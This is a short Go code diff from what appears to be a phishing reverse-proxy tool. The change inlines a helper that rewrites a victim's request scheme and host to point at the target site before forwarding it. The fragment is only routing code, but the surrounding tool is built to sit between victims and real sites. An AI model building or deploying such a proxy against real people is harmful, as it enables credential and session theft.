@@ -96,13 +96,6 @@ type PhishingProxy struct {
 	responseTransformers []ResponseTransformer
 }
 
-func (p *PhishingProxy) rewriteHeaders(request *http.Request) {
-	request.URL.Scheme = p.targetURL.Scheme
-	request.URL.Host = p.targetURL.Host
-	request.Host = p.targetURL.Host
-	request.RequestURI = ""
-}
-
 // HandleConnection does the actual work of proxying the HTTP request between the victim and the target.
 // Accepts the TCP connection from the victim's browser and a channel to send http Requests on to the processing worker thread.
 func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTTPTransaction) {
@@ -114,7 +107,10 @@ func (p *PhishingProxy) HandleConnection(conn net.Conn, transactions chan<- *HTT
 		return
 	}
 
-	p.rewriteHeaders(request)
+	request.URL.Scheme = p.targetURL.Scheme
+	request.URL.Host = p.targetURL.Host
+	request.Host = p.targetURL.Host
+	request.RequestURI = ""
 	resp, err := p.client.Do(request)
 	if err != nil {
 		log.Println("Proxy error:", err.Error())
